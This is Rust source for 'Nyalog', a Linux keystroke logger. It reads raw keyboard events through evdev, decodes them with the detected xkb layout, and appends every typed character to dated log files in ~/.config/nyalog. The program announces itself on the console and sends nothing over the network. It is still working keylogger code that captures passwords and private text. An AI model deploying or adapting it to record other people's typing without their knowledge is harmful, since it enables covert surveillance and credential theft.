use evdev::{Device, InputEventKind, Key};
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::PathBuf;
use xkbcommon::xkb::{self, Keycode};

fn get_log_dir() -> PathBuf {
    if let Ok(sudo_user) = std::env::var("SUDO_USER") {
        return PathBuf::from(format!("/home/{}", sudo_user)).join(".config/nyalog");
    }

    std::env::var("HOME")
        .map(|h| PathBuf::from(h).join(".config/nyalog"))
        .unwrap_or_else(|_| PathBuf::from(".config/nyalog"))
}

fn get_date_string() -> String {
    unsafe {
        let mut t: libc::time_t = 0;
        libc::time(&mut t);
        let tm = libc::localtime(&t);
        format!(
            "{:04}-{:02}-{:02}",
            (*tm).tm_year + 1900,
            (*tm).tm_mon + 1,
            (*tm).tm_mday
        )
    }
}

fn get_log_file() -> PathBuf {
    get_log_dir().join(format!("{}.log", get_date_string()))
}

fn ensure_log_dir() {
    let dir = get_log_dir();
    if !dir.exists() {
        fs::create_dir_all(&dir).expect("Failed to create log directory");
    }
}

fn write_to_log(content: &str) {
    ensure_log_dir();
    let path = get_log_file();

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .expect("Failed to open log file");

    file.write_all(content.as_bytes())
        .expect("Failed to write to log file");
}

fn find_keyboard() -> Option<Device> {
    let devices: Vec<_> = evdev::enumerate().collect();

    for (_, device) in devices {
        if let Some(keys) = device.supported_keys() {
            if keys.contains(Key::KEY_A) && keys.contains(Key::KEY_ENTER) {
                println!("Using device: {:?}", device.name());
                return Some(device);
            }
        }
    }
    None
}

fn try_hyprctl() -> Option<(String, String)> {
    if let Ok(output) = std::process::Command::new("hyprctl")
        .args(["devices", "-j"])
        .output()
    {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if let Some(keymap) = extract_hyprland_keymap(&stdout) {
                return Some(keymap);
            }
        }
    }

    if let Ok(sudo_user) = std::env::var("SUDO_USER") {
        let uid = get_uid_for_user(&sudo_user).unwrap_or(1000);
        let runtime_dir = format!("/run/user/{}", uid);
        let hypr_dir = format!("{}/hypr", runtime_dir);

        if let Ok(entries) = std::fs::read_dir(&hypr_dir) {
            for entry in entries.filter_map(|e| e.ok()) {
                let sig = entry.file_name().to_string_lossy().to_string();
                if sig.is_empty() || !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    continue;
                }

                if let Ok(output) = std::process::Command::new("hyprctl")
                    .args(["devices", "-j"])
                    .env("HYPRLAND_INSTANCE_SIGNATURE", &sig)
                    .env("XDG_RUNTIME_DIR", &runtime_dir)
                    .output()
                {
                    if output.status.success() {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        if let Some(keymap) = extract_hyprland_keymap(&stdout) {
                            return Some(keymap);
                        }
                    }
                }
            }
        }
    }

    None
}

fn get_uid_for_user(username: &str) -> Option<u32> {
    let output = std::process::Command::new("id")
        .args(["-u", username])
        .output()
        .ok()?;

    String::from_utf8_lossy(&output.stdout).trim().parse().ok()
}

fn get_layout_from_system() -> (String, String) {
    if let Ok(layout) = std::env::var("NYALOG_LAYOUT") {
        let parts: Vec<&str> = layout.split(':').collect();
        let variant = parts.get(1).unwrap_or(&"").to_string();
        return (parts[0].to_string(), variant);
    }

    if let Some(keymap) = try_hyprctl() {
        return keymap;
    }

    if let Ok(output) = std::process::Command::new("swaymsg")
        .args(["-t", "get_inputs", "-r"])
        .output()
    {
        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            if let Some(keymap) = extract_sway_keymap(&stdout) {
                return keymap;
            }
        }
    }

    if let Ok(output) = std::process::Command::new("setxkbmap")
        .arg("-query")
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if !stdout.contains("Xwayland") {
            let mut layout = String::from("us");
            let mut variant = String::new();

            for line in stdout.lines() {
                if line.starts_with("layout:") {
                    layout = line.split_whitespace().nth(1).unwrap_or("us").to_string();
                }
                if line.starts_with("variant:") {
                    variant = line.split_whitespace().nth(1).unwrap_or("").to_string();
                }
            }
            return (layout, variant);
        }
    }

    if let Ok(output) = std::process::Command::new("localectl")
        .arg("status")
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            if line.contains("VC Keymap:") {
                if let Some(layout) = line.split(':').nth(1) {
                    let layout = layout.trim();
                    if !layout.is_empty() && layout != "(unset)" {
                        return (layout.to_string(), String::new());
                    }
                }
            }
        }
    }

    ("us".to_string(), String::new())
}

fn extract_hyprland_keymap(json: &str) -> Option<(String, String)> {
    for line in json.lines() {
        if line.contains("active_keymap") {
            let keymap = line
                .split(':')
                .nth(1)?
                .trim()
                .trim_matches(|c| c == '"' || c == ',');

            return keymap_name_to_code(keymap);
        }
    }
    None
}

fn extract_sway_keymap(json: &str) -> Option<(String, String)> {
    for line in json.lines() {
        if line.contains("xkb_active_layout_name") {
            let keymap = line
                .split(':')
                .nth(1)?
                .trim()
                .trim_matches(|c| c == '"' || c == ',');

            return keymap_name_to_code(keymap);
        }
    }
    None
}

fn keymap_name_to_code(name: &str) -> Option<(String, String)> {
    let lower = name.to_lowercase();

    if lower.contains("swiss") || lower.contains("switzerland") {
        if lower.contains("french") {
            return Some(("ch".to_string(), "fr".to_string()));
        }
        return Some(("ch".to_string(), "de".to_string()));
    }
    if lower.contains("german") && !lower.contains("swiss") {
        return Some(("de".to_string(), String::new()));
    }
    if lower.contains("french") && !lower.contains("swiss") {
        return Some(("fr".to_string(), String::new()));
    }
    if lower.contains("italian") {
        return Some(("it".to_string(), String::new()));
    }
    if lower.contains("spanish") {
        return Some(("es".to_string(), String::new()));
    }
    if lower.contains("portuguese") {
        return Some(("pt".to_string(), String::new()));
    }
    if lower.contains("uk") || lower.contains("british") {
        return Some(("gb".to_string(), String::new()));
    }
    if lower.contains("us") || lower.contains("english") {
        return Some(("us".to_string(), String::new()));
    }

    None
}

fn setup_xkb() -> (xkb::Context, xkb::Keymap, xkb::State) {
    let context = xkb::Context::new(xkb::CONTEXT_NO_FLAGS);

    let (layout, variant) = get_layout_from_system();
    println!(
        "Detected keyboard layout: {} (variant: {})",
        layout,
        if variant.is_empty() {
            "default"
        } else {
            &variant
        }
    );

    let keymap = xkb::Keymap::new_from_names(
        &context,
        "",
        "",
        &layout,
        &variant,
        None,
        xkb::KEYMAP_COMPILE_NO_FLAGS,
    )
    .expect("Failed to create keymap");

    let state = xkb::State::new(&keymap);

    (context, keymap, state)
}

fn evdev_to_xkb_keycode(key: Key) -> Keycode {
    Keycode::new(key.code() as u32 + 8)
}

fn key_to_special(key: Key) -> Option<&'static str> {
    match key {
        Key::KEY_BACKSPACE => Some("[BS]"),
        Key::KEY_DELETE => Some("[DEL]"),
        Key::KEY_ESC => Some("[ESC]"),
        Key::KEY_UP => Some("[UP]"),
        Key::KEY_DOWN => Some("[DOWN]"),
        Key::KEY_LEFT => Some("[LEFT]"),
        Key::KEY_RIGHT => Some("[RIGHT]"),
        Key::KEY_HOME => Some("[HOME]"),
        Key::KEY_END => Some("[END]"),
        Key::KEY_PAGEUP => Some("[PGUP]"),
        Key::KEY_PAGEDOWN => Some("[PGDN]"),
        Key::KEY_F1 => Some("[F1]"),
        Key::KEY_F2 => Some("[F2]"),
        Key::KEY_F3 => Some("[F3]"),
        Key::KEY_F4 => Some("[F4]"),
        Key::KEY_F5 => Some("[F5]"),
        Key::KEY_F6 => Some("[F6]"),
        Key::KEY_F7 => Some("[F7]"),
        Key::KEY_F8 => Some("[F8]"),
        Key::KEY_F9 => Some("[F9]"),
        Key::KEY_F10 => Some("[F10]"),
        Key::KEY_F11 => Some("[F11]"),
        Key::KEY_F12 => Some("[F12]"),
        Key::KEY_INSERT => Some("[INS]"),
        Key::KEY_PRINT => Some("[PRTSC]"),
        Key::KEY_SCROLLLOCK => Some("[SCRLK]"),
        Key::KEY_PAUSE => Some("[PAUSE]"),
        _ => None,
    }
}

fn main() {
    println!("Nyalog starting...");
    println!("Logging to: {:?}", get_log_dir());

    let mut device = find_keyboard()
        .expect("No keyboard found! Make sure you're in the 'input' group or run as root.");

    let (_context, _keymap, mut state) = setup_xkb();

    println!("Press Ctrl+C to stop.\n");

    loop {
        for event in device.fetch_events().expect("Failed to fetch events") {
            if let InputEventKind::Key(key) = event.kind() {
                let value = event.value();
                let xkb_keycode = evdev_to_xkb_keycode(key);

                match value {
                    1 => {
                        state.update_key(xkb_keycode, xkb::KeyDirection::Down);

                        if let Some(special) = key_to_special(key) {
                            write_to_log(special);
                        } else {
                            let utf8 = state.key_get_utf8(xkb_keycode);
                            if !utf8.is_empty() {
                                let is_printable = utf8
                                    .chars()
                                    .all(|c| !c.is_control() || c == '\n' || c == '\t');
                                if is_printable {
                                    write_to_log(&utf8);
                                }
                            }
                        }
                    }
                    0 => {
                        state.update_key(xkb_keycode, xkb::KeyDirection::Up);
                    }
                    _ => {}
                }
            }
        }
    }
}
